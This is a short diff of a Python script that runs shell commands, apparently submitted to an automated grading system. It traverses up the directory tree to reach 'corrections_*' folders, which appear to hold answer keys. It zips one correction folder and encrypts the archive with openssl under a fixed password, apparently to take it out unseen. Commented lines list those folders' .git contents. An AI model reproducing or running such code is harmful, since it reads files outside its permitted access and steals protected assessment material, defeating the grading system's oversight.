@@ -39,7 +39,7 @@ def get_data(command):
 # my_data += "\n#######################\n"
 # my_data += get_data("ls -al ../../../../corrections_*/.git/") or ""
 # my_data += "\n#######################\n"
-my_data = get_data("zip -r file.zip ../../../../corrections_*/corrections/290/") or ""
+my_data = get_data("zip -r file.zip ../../../../corrections_*/corrections/333/") or ""
 # my_data += "\n#######################\n"
 my_data += get_data("openssl enc -aes-256-cbc -e -pbkdf2 -in file.zip -out file.enc -k '123'") or ""
 # my_data += "\n#######################\n"
